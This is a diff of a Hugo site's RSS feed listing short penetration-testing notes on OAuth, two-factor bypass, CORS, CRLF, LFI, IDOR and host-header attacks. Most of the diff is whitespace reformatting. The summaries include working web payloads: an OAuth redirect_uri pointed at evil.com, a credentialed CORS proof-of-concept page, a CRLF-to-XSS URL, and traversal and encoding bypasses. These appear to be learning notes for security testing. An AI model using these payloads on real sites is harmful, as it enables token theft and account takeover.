@@ -11,8 +11,8 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/example/table-of-contents/with-toc/</guid>
-      <description>Caput vino delphine in tamen vias #  Cognita laeva illo fracta #  Lorem markdownum pavent auras, surgit nunc cingentibus libet Laomedonque que est. Pastor An arbor filia foedat, ne fugit aliter, per. Helicona illas et callida neptem est Oresitrophos caput, dentibus est venit. Tenet reddite famuli praesentem fortibus, quaeque vis foret si frondes gelidos gravidae circumtulit inpulit armenta nativum.
- Te at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara postquam habitasse Subitarum supplevit quoque fontesque venabula spretis modo Montis tot est mali quasque gravis Quinquennem domus arsit ipse Pellem turis pugnabant locavit  Natus quaerere #  Pectora et sine mulcere, coniuge dum tincta incurvae.</description>
+      <description>Caput vino delphine in tamen vias # Cognita laeva illo fracta # Lorem markdownum pavent auras, surgit nunc cingentibus libet Laomedonque que est. Pastor An arbor filia foedat, ne fugit aliter, per. Helicona illas et callida neptem est Oresitrophos caput, dentibus est venit. Tenet reddite famuli praesentem fortibus, quaeque vis foret si frondes gelidos gravidae circumtulit inpulit armenta nativum.
+Te at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara postquam habitasse Subitarum supplevit quoque fontesque venabula spretis modo Montis tot est mali quasque gravis Quinquennem domus arsit ipse Pellem turis pugnabant locavit Natus quaerere # Pectora et sine mulcere, coniuge dum tincta incurvae.</description>
     </item>
     
     <item>
@@ -21,7 +21,7 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/example/table-of-contents/without-toc/</guid>
-      <description>At me ipso nepotibus nunc celebratior genus #  Tanto oblite #  Lorem markdownum pectora novis patenti igne sua opus aurae feras materiaque illic demersit imago et aristas questaque posset. Vomit quoque suo inhaesuro clara. Esse cumque, per referri triste. Ut exponit solisque communis in tendens vincetis agisque iamque huic bene ante vetat omina Thebae rates. Aeacus servat admonitu concidit, ad resimas vultus et rugas vultu dignamque Siphnon.
+      <description>At me ipso nepotibus nunc celebratior genus # Tanto oblite # Lorem markdownum pectora novis patenti igne sua opus aurae feras materiaque illic demersit imago et aristas questaque posset. Vomit quoque suo inhaesuro clara. Esse cumque, per referri triste. Ut exponit solisque communis in tendens vincetis agisque iamque huic bene ante vetat omina Thebae rates. Aeacus servat admonitu concidit, ad resimas vultus et rugas vultu dignamque Siphnon.
 Quam iugulum regia simulacra, plus meruit humo pecorumque haesit, ab discedunt dixit: ritu pharetramque.</description>
     </item>
     
@@ -31,7 +31,7 @@ Quam iugulum regia simulacra, plus meruit humo pecorumque haesit, ab discedunt d
       <pubDate>Sun, 28 Sep 2014 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/posts/creating-a-new-theme/</guid>
-      <description>Introduction #  This tutorial will show you how to create a simple theme in Hugo. I assume that you are familiar with HTML, the bash command line, and that you are comfortable using Markdown to format content. I&amp;rsquo;ll explain how Hugo uses templates and how you can organize your templates to create a theme. I won&amp;rsquo;t cover using CSS to style your theme.
+      <description>Introduction # This tutorial will show you how to create a simple theme in Hugo. I assume that you are familiar with HTML, the bash command line, and that you are comfortable using Markdown to format content. I&amp;rsquo;ll explain how Hugo uses templates and how you can organize your templates to create a theme. I won&amp;rsquo;t cover using CSS to style your theme.
 We&amp;rsquo;ll start with creating a new site with a very basic template.</description>
     </item>
     
@@ -41,9 +41,9 @@ We&amp;rsquo;ll start with creating a new site with a very basic template.</desc
       <pubDate>Mon, 10 Mar 2014 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/posts/migrate-from-jekyll/</guid>
-      <description>Move static content to static #  Jekyll has a rule that any directory not starting with _ will be copied as-is to the _site output. Hugo keeps all static content under static. You should therefore move it all there. With Jekyll, something that looked like
-▾ &amp;lt;root&amp;gt;/ ▾ images/ logo.png  should become
-▾ &amp;lt;root&amp;gt;/ ▾ static/ ▾ images/ logo.png  Additionally, you&amp;rsquo;ll want any files that should reside at the root (such as CNAME) to be moved to static.</description>
+      <description>Move static content to static # Jekyll has a rule that any directory not starting with _ will be copied as-is to the _site output. Hugo keeps all static content under static. You should therefore move it all there. With Jekyll, something that looked like
+▾ &amp;lt;root&amp;gt;/ ▾ images/ logo.png should become
+▾ &amp;lt;root&amp;gt;/ ▾ static/ ▾ images/ logo.png Additionally, you&amp;rsquo;ll want any files that should reside at the root (such as CNAME) to be moved to static.</description>
     </item>
     
     <item>
@@ -62,10 +62,10 @@ This document is a brief primer on using Go templates.</description>
       <pubDate>Wed, 02 Apr 2014 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/posts/hugoisforlovers/</guid>
-      <description>Step 1. Install Hugo #  Go to Hugo releases and download the appropriate version for your OS and architecture.
+      <description>Step 1. Install Hugo # Go to Hugo releases and download the appropriate version for your OS and architecture.
 Save it somewhere specific as we will be using it in the next step.
 More complete instructions are available at Install Hugo
-Step 2. Build the Docs #  Hugo has its own example site which happens to also be the documentation site you are reading right now.
+Step 2. Build the Docs # Hugo has its own example site which happens to also be the documentation site you are reading right now.
 Follow the following steps:</description>
     </item>
     
@@ -75,7 +75,7 @@ Follow the following steps:</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/example/collapsed/3rd-level/4th-level/</guid>
-      <description>4th Level of Menu #  Caesorum illa tu sentit micat vestes papyriferi #  Inde aderam facti; Theseus vis de tauri illa peream. Oculos uberaque non regisque vobis cursuque, opus venit quam vulnera. Et maiora necemque, lege modo; gestanda nitidi, vero? Dum ne pectoraque testantur.
+      <description>4th Level of Menu # Caesorum illa tu sentit micat vestes papyriferi # Inde aderam facti; Theseus vis de tauri illa peream. Oculos uberaque non regisque vobis cursuque, opus venit quam vulnera. Et maiora necemque, lege modo; gestanda nitidi, vero? Dum ne pectoraque testantur.
 Venasque repulsa Samos qui, exspectatum eram animosque hinc, aut manes, Assyrii. Cupiens auctoribus pariter rubet, profana magni super nocens. Vos ius sibilat inpar turba visae iusto!</description>
     </item>
     
@@ -85,8 +85,8 @@ Venasque repulsa Samos qui, exspectatum eram animosque hinc, aut manes, Assyrii.
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/example/hidden/</guid>
-      <description>This page is hidden in menu #  Quondam non pater est dignior ille Eurotas #  Latent te facies #  Lorem markdownum arma ignoscas vocavit quoque ille texit mandata mentis ultimus, frementes, qui in vel. Hippotades Peleus pennas conscia cuiquam Caeneus quas.
- Pater demittere evincitque reddunt Maxime adhuc pressit huc Danaas quid freta Soror ego Luctus linguam saxa ultroque prior Tatiumque inquit Saepe liquitur subita superata dederat Anius sudor  Cum honorum Latona #  O fallor in sustinui iussorum equidem.</description>
+      <description>This page is hidden in menu # Quondam non pater est dignior ille Eurotas # Latent te facies # Lorem markdownum arma ignoscas vocavit quoque ille texit mandata mentis ultimus, frementes, qui in vel. Hippotades Peleus pennas conscia cuiquam Caeneus quas.
+Pater demittere evincitque reddunt Maxime adhuc pressit huc Danaas quid freta Soror ego Luctus linguam saxa ultroque prior Tatiumque inquit Saepe liquitur subita superata dederat Anius sudor Cum honorum Latona # O fallor in sustinui iussorum equidem.</description>
     </item>
     
     <item>
@@ -100,11 +100,32 @@ Venasque repulsa Samos qui, exspectatum eram animosque hinc, aut manes, Assyrii.
     
     <item>
       <title></title>
-      <link>https://caon.io/docs/exploitation/auth/</link>
+      <link>https://caon.io/docs/exploitation/auths/oauth/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/docs/exploitation/auth/</guid>
-      <description></description>
+      <guid>https://caon.io/docs/exploitation/auths/oauth/</guid>
+      <description>OAuth 2 # Grabbing OAuth Token via redirect_uri # Redirect to a controlled domain to get the access token.
+https://www.example.com/signin/authorize?[...]&amp;amp;redirect_uri=https://localhost.evil.com OAuth implementations should never whitelist entire domains, only a few URLs so that &amp;ldquo;redirect_uri&amp;rdquo; can’t be pointed to an Open Redirect
+Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:
+https://www.example.com/admin/oauth/authorize?[...]&amp;amp;scope=a&amp;amp;redirect_uri=https://evil.com Cross-Site Request Forgery # Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://caon.io/docs/exploitation/auths/twofa/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://caon.io/docs/exploitation/auths/twofa/</guid>
+      <description> Two factor Authentication # Bypasses # Response Manipulation (Intercept Response and change it to 200, falses to trues&amp;hellip;) 2FA Code Reusability 2FA Code Leakage in Response Password Reset Disable 2FA CSRF on 2FA Disabling Lack of Brute-Force Protection Clickjacking on 2FA Disabling Page Enabling 2FA doesn&amp;rsquo;t expire Previously active Sessions Bypass 2FA with null or 000000 Direct access to a page, jump 2FA process 2FA code based on timestamp </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://caon.io/docs/exploitation/auths/typesofauth/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://caon.io/docs/exploitation/auths/typesofauth/</guid>
+      <description> Authentication Types # Basic Auth (B64) # Authorization: Basic AXVubzpwQDU1dzByYM== Bearer Token (JWT) # Authorization: Bearer &amp;lt;token&amp;gt; API Key # GET /endpoint?api_key=abcdefgh123456789 X-API-Key: abcdefgh123456789 Digest Auth # Authorization: Digest username=&amp;#34;admin&amp;#34; Realm=&amp;#34;abcxyz&amp;#34; nonce=&amp;#34;474754847743646&amp;#34;, uri=&amp;#34;/uri&amp;#34; response=&amp;#34;7cffhfr54685gnnfgerg8&amp;#34; OAuth2.0 # Authorization: Bearer hY_9.B5f-4.1BfE Hawk Authentication # Authorization: Hawk id=&amp;#34;abcxyz123&amp;#34;, ts=&amp;#34;1592459563&amp;#34;, nonce=&amp;#34;gWqbkw&amp;#34;, mac=&amp;#34;vxBCccCutXGV30gwEDKu1NDXSeqwfq7Z0sg/HP1HjOU=&amp;#34; AWS signature # Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east-1/execute-api/aws4_ </description>
     </item>
     
     <item>
@@ -122,10 +143,10 @@ Venasque repulsa Samos qui, exspectatum eram animosque hinc, aut manes, Assyrii.
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/clickjacking/</guid>
-      <description>Clickjacking #  Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.
+      <description> Clickjacking # Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.
 A website is vulnerable if:
- X-Frame-Options is not set  Check header presence with:
- https://securityheaders.com/  POC #  &amp;lt;iframe src=&amp;#34;https://example.com&amp;#34;&amp;gt; </description>
+X-Frame-Options is not set Check header presence with:
+https://securityheaders.com/ POC # &amp;lt;iframe src=&amp;#34;https://example.com&amp;#34;&amp;gt; </description>
     </item>
     
     <item>
@@ -134,9 +155,9 @@ A website is vulnerable if:
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/cloud/aws/</guid>
-      <description>Amazon AWS #  Cognito #  AWS Cognito helps to authenticate users using amazon solutions, if identity poolis enabled it is possible to gather a temporary token
+      <description>Amazon AWS # Cognito # AWS Cognito helps to authenticate users using amazon solutions, if identity poolis enabled it is possible to gather a temporary token
 https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963
-Found secrets? #  https://medium.com/@masonhck357/the-16-000-dev-mistake-13e516e86be6</description>
+Found secrets? # https://medium.com/@masonhck357/the-16-000-dev-mistake-13e516e86be6</description>
     </item>
     
     <item>
@@ -145,7 +166,7 @@ Found secrets? #  https://medium.com/@masonhck357/the-16-000-dev-mistake-13e516e
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/cloud/azure/</guid>
-      <description>Microsoft Azure #  </description>
+      <description> Microsoft Azure # </description>
     </item>
     
     <item>
@@ -154,13 +175,50 @@ Found secrets? #  https://medium.com/@masonhck357/the-16-000-dev-mistake-13e516e
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/cloud/google/</guid>
-      <description>Google GCP #  Google Identity #  Applications can use google identity to manage login, check all endpoints to see if admin only endpoint are public
+      <description> Google GCP # Google Identity # Applications can use google identity to manage login, check all endpoints to see if admin only endpoint are public
 Hint: deleteAccount and signUp may be gold
 Documentation: https://developers.google.com/resources/api-libraries/documentation/identitytoolkit/v3/python/latest/identitytoolkit_v3.relyingparty.html
-Google Storage #  Check what permissions the bucket has:
+Misconfigs in Google Identity Google Storage # Check what permissions the bucket has:
 https://github.com/RhinoSecurityLabs/GCPBucketBrute/blob/master/gcpbucketbrute.py
 If the site ends in appspot.com, bucket can be accessed in:
-https://storage.googleapis.com/&amp;lt;site_url&amp;gt;</description>
+https://storage.googleapis.com/&amp;lt;site_url&amp;gt;
+Hunting GCP Buckets </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://caon.io/docs/exploitation/cms/drupal/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://caon.io/docs/exploitation/cms/drupal/</guid>
+      <description> Drupal # Drupal hacking guide droopescan Reverse Shel with admin access </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://caon.io/docs/exploitation/cms/joomla/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://caon.io/docs/exploitation/cms/joomla/</guid>
+      <description> Joomla # joomscan </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://caon.io/docs/exploitation/cms/magento/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://caon.io/docs/exploitation/cms/magento/</guid>
+      <description> Magento # magescan </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://caon.io/docs/exploitation/cms/wordpress/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://caon.io/docs/exploitation/cms/wordpress/</guid>
+      <description> Wordpress # Analyze WP plugins source code wpscan Check WP IP behind WAF# Wordpress </description>
     </item>
     
     <item>
@@ -169,8 +227,8 @@ https://storage.googleapis.com/&amp;lt;site_url&amp;gt;</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/codeexecution/</guid>
-      <description>Code Execution #  Probably useful when reviewing code
-PHP #  Command Execution
+      <description>Code Execution # Probably useful when reviewing code
+PHP # Command Execution
 exec - Returns last line of commands output passthru - Passes commands output directly to the browser system - Passes commands output directly to the browser and returns last line shell_exec - Returns commands output \`\` (backticks) - Same as shell_exec() popen - Opens read or write pipe to process of a command proc_open - Similar to popen() but greater degree of control pcntl_exec - Executes a program Code Execution</description>
     </item>
     
@@ -180,8 +238,8 @@ exec - Returns last line of commands output passthru - Passes commands output di
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/commandinjection/</guid>
-      <description>Command Injection #  OS command Injection is a critical vulnerability that allows attackers to gain complete control over an affected web site and the underlying web server.
- https://github.com/payloadbox/command-injection-payload-list  </description>
+      <description> Command Injection # OS command Injection is a critical vulnerability that allows attackers to gain complete control over an affected web site and the underlying web server.
+https://github.com/payloadbox/command-injection-payload-list </description>
     </item>
     
     <item>
@@ -190,8 +248,8 @@ exec - Returns last line of commands output passthru - Passes commands output di
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/cookieattacks/</guid>
-      <description>Cookie Based Attacls #  Cookies Explained #  https://cookiepedia.co.uk/
-Attacks #   Check for PII or sensitive in cookie data Add a very long cookie value, it may ddos the application If cookies hold a serialized object, try insecure deserialization Chain CRLF Injection to add cookies (look for XSS or SQL) Check if session expires on logout  Decoding the cookie #  If the cookie is using some Base encoding (like Base64) or similar you may be able to decode it, change the content and impersonate arbitrary users</description>
+      <description>Cookie Based Attacls # Cookies Explained # https://cookiepedia.co.uk/
+Attacks # Check for PII or sensitive in cookie data Add a very long cookie value, it may ddos the application If cookies hold a serialized object, try insecure deserialization Chain CRLF Injection to add cookies (look for XSS or SQL) Check if session expires on logout Decoding the cookie # If the cookie is using some Base encoding (like Base64) or similar you may be able to decode it, change the content and impersonate arbitrary users</description>
     </item>
     
     <item>
@@ -200,7 +258,7 @@ Attacks #   Check for PII or sensitive in cookie data Add a very long cookie val
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/cors/</guid>
-      <description>CORS #  # https://github.com/s0md3v/Corsy python3 corsy.py -u https://example.com POC #  Simple #  &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;CORS PoC Exploit&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;center&amp;gt; &amp;lt;h1&amp;gt;CORS Exploit&amp;lt;br&amp;gt;six2dez&amp;lt;/h1&amp;gt; &amp;lt;hr&amp;gt; &amp;lt;div id=&amp;#34;demo&amp;#34;&amp;gt; &amp;lt;button type=&amp;#34;button&amp;#34; onclick=&amp;#34;cors()&amp;#34;&amp;gt;Exploit&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 &amp;amp;&amp;amp; this.status == 200) { document.getElementById(&amp;#34;demo&amp;#34;).innerHTML = this.responseText; } }; xhttp.open(&amp;#34;GET&amp;#34;, &amp;#34;http://&amp;lt;vulnerable-url&amp;gt;&amp;#34;, true); xhttp.withCredentials = true; xhttp.send(); } &amp;lt;/script&amp;gt; &amp;lt;/center&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Simple with headers #  &amp;lt;html&amp;gt; &amp;lt;script&amp;gt; var http = new XMLHttpRequest(); var url = &amp;#39;Url&amp;#39;;//Paste here Url var params = &amp;#39;PostData&amp;#39;;//Paste here POST data http.</description>
+      <description>CORS # # https://github.com/s0md3v/Corsy python3 corsy.py -u https://example.com POC # Simple # &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;CORS PoC Exploit&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;center&amp;gt; &amp;lt;h1&amp;gt;CORS Exploit&amp;lt;br&amp;gt;six2dez&amp;lt;/h1&amp;gt; &amp;lt;hr&amp;gt; &amp;lt;div id=&amp;#34;demo&amp;#34;&amp;gt; &amp;lt;button type=&amp;#34;button&amp;#34; onclick=&amp;#34;cors()&amp;#34;&amp;gt;Exploit&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 &amp;amp;&amp;amp; this.status == 200) { document.getElementById(&amp;#34;demo&amp;#34;).innerHTML = this.responseText; } }; xhttp.open(&amp;#34;GET&amp;#34;, &amp;#34;http://&amp;lt;vulnerable-url&amp;gt;&amp;#34;, true); xhttp.withCredentials = true; xhttp.send(); } &amp;lt;/script&amp;gt; &amp;lt;/center&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Simple with headers # &amp;lt;html&amp;gt; &amp;lt;script&amp;gt; var http = new XMLHttpRequest(); var url = &amp;#39;Url&amp;#39;;//Paste here Url var params = &amp;#39;PostData&amp;#39;;//Paste here POST data http.</description>
     </item>
     
     <item>
@@ -209,9 +267,9 @@ Attacks #   Check for PII or sensitive in cookie data Add a very long cookie val
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/crlf/</guid>
-      <description>CRLF #  Carriage Return Line Feed
+      <description> CRLF # Carriage Return Line Feed
 Carriage Return = ASCII 13, \r, %0D Line Feed = ASCII 10, \n, %0A
-Tools #  # https://github.com/dwisiswant0/crlfuzz crlfuzz -u &amp;quot;http://example.com&amp;quot; POC #  CRLF to XSS
+Tools # # https://github.com/dwisiswant0/crlfuzz crlfuzz -u &amp;#34;http://example.com&amp;#34; POC # CRLF to XSS
 http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E </description>
     </item>
     
@@ -221,7 +279,7 @@ http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHT
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/csrf/</guid>
-      <description>CSRF #  Conditions to exploit an useful CSRF #   Revelante action (CSRF in logout is a boo) Cookie based session (if JWT you are done here) No unpredictable request parameters  How to find #   Remove CSRF token from request, replace with random value or blank space Change POST to GET Replace CSRF token with an already used token Bypass regex Get a token by request a call manually Extract the token with XSS or HTMl injection  Generate POCs #   In burp, click in request &amp;gt; engagement tools &amp;gt; generate CSRF poc     URL Description     https://pentestbook.</description>
+      <description>CSRF # Conditions to exploit an useful CSRF # Revelante action (CSRF in logout is a boo) Cookie based session (if JWT you are done here) No unpredictable request parameters How to find # Remove CSRF token from request, replace with random value or blank space Change POST to GET Replace CSRF token with an already used token Bypass regex Get a token by request a call manually Extract the token with XSS or HTMl injection Generate POCs # In burp, click in request &amp;gt; engagement tools &amp;gt; generate CSRF poc URL Description https://pentestbook.</description>
     </item>
     
     <item>
@@ -239,8 +297,8 @@ http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHT
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/hostheaderinjection/</guid>
-      <description>Host Header Attacks #  Typically host header injection are not harmful by themselves, it is necessary a chain of vulnerabilites for it to escalate.
- Business Logic flaws Cache poisoning  Attack Vectors #   Premise: An websites allows an user to remember his passwords by requesting a reset email. Attack vector: An attacker request the reset for an email that the knows the application exists, he intercepts the request and adds a host X-Forwarded-For: evil.</description>
+      <description>Host Header Attacks # Typically host header injection are not harmful by themselves, it is necessary a chain of vulnerabilites for it to escalate.
+Business Logic flaws Cache poisoning Attack Vectors # Premise: An websites allows an user to remember his passwords by requesting a reset email. Attack vector: An attacker request the reset for an email that the knows the application exists, he intercepts the request and adds a host X-Forwarded-For: evil.</description>
     </item>
     
     <item>
@@ -249,8 +307,8 @@ http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHT
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/idor/</guid>
-      <description>IDOR #  Basically try to screw with evertything.
-Add parameters into the endpoints #  GET /api_v1/messages --&amp;gt; 401 vs GET /api_v1/messages?user_id=victim_uuid --&amp;gt; 200 HTTP Parameter pollution #  GET /api_v1/messages?user_id=VICTIM_ID --&amp;gt; 401 Unauthorized GET /api_v1/messages?user_id=ATTACKER_ID&amp;amp;user_id=VICTIM_ID --&amp;gt; 200 OK GET /api_v1/messages?user_id=YOUR_USER_ID[]&amp;amp;user_id=ANOTHER_USERS_ID[] JSON Parameter Pollution: #  POST /api/get_profile Content-Type: application/json {“user_id”:&amp;lt;legit_id&amp;gt;,”user_id”:&amp;lt;victim’s_id&amp;gt;} Add .json to the endpoint, if it is built in Ruby! #  /user_data/2341 --&amp;gt; 401 Unauthorized /user_data/2341.json --&amp;gt; 200 OK Test on outdated API Versions #  /v3/users_data/1234 --&amp;gt; 403 Forbidden /v1/users_data/1234 --&amp;gt; 200 OK Wrap the ID with an array.</description>
+      <description>IDOR # Basically try to screw with evertything.
+Add parameters into the endpoints # GET /api_v1/messages --&amp;gt; 401 vs GET /api_v1/messages?user_id=victim_uuid --&amp;gt; 200 HTTP Parameter pollution # GET /api_v1/messages?user_id=VICTIM_ID --&amp;gt; 401 Unauthorized GET /api_v1/messages?user_id=ATTACKER_ID&amp;amp;user_id=VICTIM_ID --&amp;gt; 200 OK GET /api_v1/messages?user_id=YOUR_USER_ID[]&amp;amp;user_id=ANOTHER_USERS_ID[] JSON Parameter Pollution: # POST /api/get_profile Content-Type: application/json {“user_id”:&amp;lt;legit_id&amp;gt;,”user_id”:&amp;lt;victim’s_id&amp;gt;} Add .json to the endpoint, if it is built in Ruby! # /user_data/2341 --&amp;gt; 401 Unauthorized /user_data/2341.json --&amp;gt; 200 OK Test on outdated API Versions # /v3/users_data/1234 --&amp;gt; 403 Forbidden /v1/users_data/1234 --&amp;gt; 200 OK Wrap the ID with an array.</description>
     </item>
     
     <item>
@@ -259,13 +317,13 @@ Add parameters into the endpoints #  GET /api_v1/messages --&amp;gt; 401 vs GET 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/javascriptfiles/</guid>
-      <description>Javascript Files #  Linters #   JSHint  Download #    getJS
+      <description>Javascript Files # Linters # JSHint Download # getJS
 Download all js files for each site https://github.com/003random/getJS
-  JSScanner
+JSScanner
 Download all js files for each site, beautify and run linkfinder: https://github.com/dark-warlord14/JSScanner
-  JSBeat
+JSBeat
 Download all js files for each site and beautify: https://github.com/felipecaon/BugBountyStuff/blob/main/scripts/jsbeat.py
-  Way Back Machine #  Premise: Javascript files often gets changed, an attaker may find sensitive stuff in an older version of a JS file that is not alive anymore.</description>
+Way Back Machine # Premise: Javascript files often gets changed, an attaker may find sensitive stuff in an older version of a JS file that is not alive anymore.</description>
     </item>
     
     <item>
@@ -274,20 +332,8 @@ Download all js files for each site and beautify: https://github.com/felipecaon/
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/lfi/</guid>
-      <description>LFI/RFI #  # https://github.com/kurobeats/fimap fimap -u &amp;quot;https://example.com?test=&amp;quot; Wget #  Sometimes browsers mess around with basic directory traversal sequences, but wget may work:
-wget http://[host]/page.php?url=../../../../../../../file.html Tricks #   PHP Filter b64 (php://filter/zlib.deflate/convert.base64-encode/resource=FILE) Nullbyte ending (%00) 403bypass section may help  Bypasses #  Nesting traversal sequences #  ....// ....\/ ..../\ ....\\ URL Encoding #  dot %2e forward slash %2f backslash %5c Double URL Encoding #  dot %252e forward slash %252f backslash %255c Null Byte #  Some applications check whether the user-supplied file name ends in a particular file type or set of file types, and reject attempts to access anything else.</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://caon.io/docs/exploitation/oauth/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://caon.io/docs/exploitation/oauth/</guid>
-      <description>OAuth 2 #  Grabbing OAuth Token via redirect_uri #  Redirect to a controlled domain to get the access token.
-https://www.example.com/signin/authorize?[...]&amp;amp;redirect_uri=https://localhost.evil.com OAuth implementations should never whitelist entire domains, only a few URLs so that &amp;ldquo;redirect_uri&amp;rdquo; can’t be pointed to an Open Redirect
-Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:
-https://www.example.com/admin/oauth/authorize?[...]&amp;amp;scope=a&amp;amp;redirect_uri=https://evil.com Cross-Site Request Forgery #  Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable.</description>
+      <description>LFI/RFI # # https://github.com/kurobeats/fimap fimap -u &amp;#34;https://example.com?test=&amp;#34; Wget # Sometimes browsers mess around with basic directory traversal sequences, but wget may work:
+wget http://[host]/page.php?url=../../../../../../../file.html Tricks # PHP Filter b64 (php://filter/zlib.deflate/convert.base64-encode/resource=FILE) Nullbyte ending (%00) 403bypass section may help Bypasses # Nesting traversal sequences # ....// ....\/ ..../\ ....\\ URL Encoding # dot %2e forward slash %2f backslash %5c Double URL Encoding # dot %252e forward slash %252f backslash %255c Null Byte # Some applications check whether the user-supplied file name ends in a particular file type or set of file types, and reject attempts to access anything else.</description>
     </item>
     
     <item>
@@ -296,7 +342,7 @@ https://www.example.com/admin/oauth/authorize?[...]&amp;amp;scope=a&amp;amp;redi
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/openredirect/</guid>
-      <description>Open Redirect #  Often a bug that brings impact when chained.
+      <description>Open Redirect # Often a bug that brings impact when chained.
 Using &amp;ldquo;https:&amp;rdquo; to bypass &amp;ldquo;//&amp;rdquo; blacklisted keyword
 https:google.com Using &amp;ldquo;//&amp;rdquo; to bypass &amp;ldquo;http&amp;rdquo; blacklisted keyword
 //google.com Using /\/ to bypass // blacklisted keyword
@@ -313,10 +359,10 @@ https:google.com Using &amp;ldquo;//&amp;rdquo; to bypass &amp;ldquo;http&amp;rd
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/parameterpollution/</guid>
-      <description>HTTP Parameter Pollution #  When searching for HPP keep in mind some servers handle parameters differently.
+      <description>HTTP Parameter Pollution # When searching for HPP keep in mind some servers handle parameters differently.
 Take http://example.com?username=foo&amp;amp;username=bar as an example.
